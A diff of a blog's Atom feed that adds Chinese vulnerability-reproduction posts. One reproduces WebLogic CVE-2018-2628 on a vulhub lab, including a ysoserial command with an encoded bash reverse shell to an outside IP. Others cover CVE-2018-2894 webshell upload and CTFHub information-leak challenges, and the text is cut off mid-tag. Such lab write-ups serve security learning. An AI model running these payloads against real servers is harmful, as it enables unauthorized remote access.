@@ -6,7 +6,7 @@
   <link href="https://hzktester.top/atom.xml" rel="self"/>
   
   <link href="https://hzktester.top/"/>
-  <updated>2020-09-27T06:58:02.869Z</updated>
+  <updated>2020-09-27T08:19:42.994Z</updated>
   <id>https://hzktester.top/</id>
   
   <author>
@@ -17,11 +17,37 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>WebLogic T3协议反序列化漏洞复现（CVE-2018-2628）</title>
+    <link href="https://hzktester.top/2020/09/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WebLogic%20T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-2628%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/09/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WebLogic%20T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-2628%EF%BC%89/</id>
+    <published>2020-09-27T08:19:00.000Z</published>
+    <updated>2020-09-27T08:19:42.994Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，获取目标服务器权限。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.2<br>Weblogic 12.2.1.3</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h3><p>使用vulhub搭建漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub&#x2F;weblogic&#x2F;CVE-2018-2628</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092711.png" alt="image"></p><p>访问 <a href="http://47.101.62.20:7001/console">http://47.101.62.20:7001/console</a> 初始化整个环境</p><h3 id="攻击机环境"><a href="#攻击机环境" class="headerlink" title="攻击机环境"></a>攻击机环境</h3><p>下载 <strong>ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</strong>利用包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;brianwrf&#x2F;ysoserial&#x2F;releases&#x2F;download&#x2F;0.0.6-pri-beta&#x2F;ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092712.png" alt="image"></p><p>下载漏洞利用EXP，我这里已经下载好了</p><p><a href="https://www.exploit-db.com/exploits/44553">https://www.exploit-db.com/exploits/44553</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>监听端口19110</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092713.png" alt="image"></p><p>使用<strong>ysoserial</strong>启动一个<strong>JMRP Server</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 19111 CommonsCollections1 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTkxMTAgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><blockquote><p>JMRP Server在19111端口上监听请求，向目标服务器发送序列化的bash反弹shell命令，反弹监听的端口为19110</p></blockquote><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092714.png" alt="image"></p><p>使用CVE-2018-2628的EXP向目标WebLogic服务器发送攻击载荷</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2018-2628.py 47.101.62.20 7001 ..&#x2F;ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 47.101.62.20 19111 JRMPClient</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092715.png" alt="image"></p><p>成功反弹shell</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092716.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h2&gt;&lt;p&gt;开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，获取目标服务器权限。&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Weblogic 10.3.6.0&lt;br&gt;Weblogic 12.1.3.0&lt;br&gt;Weblogic 12.2.1.2&lt;br&gt;Weblogic 12.2.1.3&lt;/p&gt;
+&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;h3 id=&quot;靶机环境&quot;&gt;&lt;a href=&quot;#靶机环境&quot; class=&quot;headerlink&quot; title=&quot;靶机环境&quot;&gt;&lt;/a&gt;靶机环境&lt;/h3&gt;&lt;p&gt;使用vulhub搭建漏洞环境&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd vulhub&amp;#x2F;weblogic&amp;#x2F;CVE-2018-2628&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose build&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092711.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;访问 &lt;a href=&quot;http://47.101.62.20:7001/console&quot;&gt;http://47.101.62.20:7001/console&lt;/a&gt; 初始化整个环境&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="WebLogic" scheme="https://hzktester.top/tags/WebLogic/"/>
+    
+  </entry>
+  
+  <entry>
     <title>WebLogic任意文件上传漏洞复现（CVE-2018-2894）</title>
     <link href="https://hzktester.top/2020/09/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-2894%EF%BC%89/"/>
     <id>https://hzktester.top/2020/09/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-2894%EF%BC%89/</id>
-    <published>2020-09-27T02:51:00.000Z</published>
-    <updated>2020-09-27T06:58:02.869Z</updated>
+    <published>2020-09-27T06:38:00.000Z</published>
+    <updated>2020-09-27T08:19:27.636Z</updated>
     
     <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Oracle官方发布了7月份的关键补丁更新CPU（Critical Patch Update）,其中包含一个高危的Weblogic未授权任意文件上传漏洞(CVE-2018-2894)</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Oracle WebLogic Server，版本<strong>10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3</strong>。 </p><p>该漏洞的影响模块为web服务测试页，在默认情况下不启用。 受影响的页面为 <strong>/ws_utc/config.do</strong> 和 <strong>/ws_utc/begin.do</strong></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulhub搭建漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub&#x2F;weblogic&#x2F;CVE-2018-2894</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>直接访问存在漏洞的页面<strong><a href="http://47.101.62.20:7001/ws_utc/config.do">http://47.101.62.20:7001/ws_utc/config.do</a></strong><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092706.png" alt="image"></p><p>将目录设置为<strong>ws_utc</strong>应用的静态文件css目录，访问这个目录是无需权限的,可以直接进行访问上传的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092707.png" alt="image"></p><p>打开安全页面，然后上传<strong>webshell</strong>，并且获取时间戳<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092708.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092709.png" alt="image"></p><p>访问上传的jsp马</p><blockquote><p>具体格式为 <a href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p></blockquote><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092710.png" alt="image"></p>]]></content>
     
@@ -417,6 +443,33 @@
   </entry>
   
   <entry>
+    <title>Web基础之信息泄露（上）</title>
+    <link href="https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/</id>
+    <published>2020-08-18T07:31:00.000Z</published>
+    <updated>2020-09-20T02:41:21.793Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081801.png" alt="image"></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名。</p><p>路径遍历漏洞隐藏一般在文件读取或者展示图片功能块这样的通过参数提交上来的文件名</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081802.png" alt="image"></p><p>点击之后会跳转到flag_in_here这个目录，挨个对里面的目录进行寻找拿到flag</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081803.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081804.png" alt="image"></p><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081805.png" alt="image"></p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>PHPinfo：输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)。</p><p>　　phpinfo() 同时是个很有价值的、包含所有 EGPCS(Environment, GET, POST, Cookie, Server) 数据的调试工具。</p><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>打开是这样的~</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081806.png" alt="image"></p><p>浏览目录找到flag</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081807.png" alt="image"></p><h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码泄露"><a href="#网站源码泄露" class="headerlink" title="网站源码泄露"></a>网站源码泄露</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081808.png" alt="image"></p><h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><p>常见的网站源码的文件名有：’web’, ‘website’, ‘backup’, ‘back’, ‘www’, ‘wwwroot’, ‘temp’等等。</p><p>常见的网站源码备份文件后缀有：’tar’, ‘tar.gz’, ‘zip’, ‘rar’等等。</p><h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><p>只需在网站根目录对可能存在的备份文件名进行遍历爆破。就可以下载到网站源码。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081809.png" alt="image"></p><h3 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081810.png" alt="image"></p><h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码~</p><h4 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h4><p>访问链接，看到这样：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081811.png" alt="image"></p><p>flag在index.php的源码里，同时我们想到这是bak文件，试试访问</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081812.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081813.png" alt="image"></p><p>用notepad++打开</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081814.png" alt="image"></p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081815.png" alt="image"></p><h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h4><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p><p>以 index.php 为例：第一次产生的交换文件名为 <strong>.index.php.swp</strong></p><p>再次意外退出后，将会产生名为 <strong>.index.php.swo</strong> 的交换文件</p><p>第三次产生的交换文件则为 <strong>.index.php.swn</strong></p><h4 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h4><p>将缓存文件下载下来，使用vim编辑原有文件，例如下载的 <strong>.index.php.swp</strong>，则说明之前编辑的文件名为<strong>index.php</strong></p><p>会提示是否恢复，选择<strong>R</strong>进行恢复即可看到原始内容</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081816.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081817.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081818.png" alt="image"></p><h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081819.png" alt="image"></p><h4 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h4><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。</p><p>如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p><p>这里需要一个py脚本：<strong>Python-dsstore-master</strong></p><h4 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081820.png" alt="image"></p><p>进入Python-dsstore-master目录</p><p>依次输入下图的命令：</p><p>生成.DS_Store.ctfhub（名字可以自定义）</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081821.png" alt="image"></p><p>用Python-dsstore-master目录中的main.py对刚刚生成的文件.DS_Store.ctfhub进行解析。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081822.png" alt="image"></p><p>访问我们看到的.txt文件得到flag</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081823.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;目录遍历&quot;&gt;&lt;a href=&quot;#目录遍历&quot; class=&quot;headerlink&quot; title=&quot;目录遍历&quot;&gt;&lt;/a&gt;目录遍历&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081801.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h3&gt;&lt;p&gt;许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名。&lt;/p&gt;
+&lt;p&gt;路径遍历漏洞隐藏一般在文件读取或者展示图片功能块这样的通过参数提交上来的文件名&lt;/p&gt;
+&lt;h3 id=&quot;题解&quot;&gt;&lt;a href=&quot;#题解&quot; class=&quot;headerlink&quot; title=&quot;题解&quot;&gt;&lt;/a&gt;题解&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081802.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;点击之后会跳转到flag_in_here这个目录，挨个对里面的目录进行寻找拿到flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081803.png&quot; alt=&quot;image&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081804.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;PHPINFO&quot;&gt;&lt;a href=&quot;#PHPINFO&quot; class=&quot;headerlink&quot; title=&quot;PHPINFO&quot;&gt;&lt;/a&gt;PHPINFO&lt;/h2&gt;</summary>
+    
+    
+    
+    <category term="Web基础" scheme="https://hzktester.top/categories/Web%E5%9F%BA%E7%A1%80/"/>
+    
+    
+    <category term="信息泄露" scheme="https://hzktester.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Web基础之信息泄露（下）</title>
     <link href="https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
     <id>https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/</id>
@@ -444,29 +497,26 @@
   </entry>
   
   <entry>
-    <title>Web基础之信息泄露（上）</title>
-    <link href="https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
-    <id>https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/</id>
-    <published>2020-08-18T07:31:00.000Z</published>
-    <updated>2020-09-20T02:41:21.793Z</updated>
+    <title>APP反编译-下载源码</title>
+    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/"/>
+    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</id>
+    <published>2020-08-16T07:31:00.000Z</published>
+    <updated>2020-09-18T11:41:04.722Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081801.png" alt="image"></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名。</p><p>路径遍历漏洞隐藏一般在文件读取或者展示图片功能块这样的通过参数提交上来的文件名</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081802.png" alt="image"></p><p>点击之后会跳转到flag_in_here这个目录，挨个对里面的目录进行寻找拿到flag</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081803.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081804.png" alt="image"></p><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081805.png" alt="image"></p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>PHPinfo：输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)。</p><p>　　phpinfo() 同时是个很有价值的、包含所有 EGPCS(Environment, GET, POST, Cookie, Server) 数据的调试工具。</p><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>打开是这样的~</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081806.png" alt="image"></p><p>浏览目录找到flag</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081807.png" alt="image"></p><h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码泄露"><a href="#网站源码泄露" class="headerlink" title="网站源码泄露"></a>网站源码泄露</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081808.png" alt="image"></p><h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><p>常见的网站源码的文件名有：’web’, ‘website’, ‘backup’, ‘back’, ‘www’, ‘wwwroot’, ‘temp’等等。</p><p>常见的网站源码备份文件后缀有：’tar’, ‘tar.gz’, ‘zip’, ‘rar’等等。</p><h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><p>只需在网站根目录对可能存在的备份文件名进行遍历爆破。就可以下载到网站源码。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081809.png" alt="image"></p><h3 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081810.png" alt="image"></p><h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码~</p><h4 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h4><p>访问链接，看到这样：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081811.png" alt="image"></p><p>flag在index.php的源码里，同时我们想到这是bak文件，试试访问</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081812.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081813.png" alt="image"></p><p>用notepad++打开</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081814.png" alt="image"></p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081815.png" alt="image"></p><h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h4><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p><p>以 index.php 为例：第一次产生的交换文件名为 <strong>.index.php.swp</strong></p><p>再次意外退出后，将会产生名为 <strong>.index.php.swo</strong> 的交换文件</p><p>第三次产生的交换文件则为 <strong>.index.php.swn</strong></p><h4 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h4><p>将缓存文件下载下来，使用vim编辑原有文件，例如下载的 <strong>.index.php.swp</strong>，则说明之前编辑的文件名为<strong>index.php</strong></p><p>会提示是否恢复，选择<strong>R</strong>进行恢复即可看到原始内容</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081816.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081817.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081818.png" alt="image"></p><h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081819.png" alt="image"></p><h4 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h4><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。</p><p>如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p><p>这里需要一个py脚本：<strong>Python-dsstore-master</strong></p><h4 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081820.png" 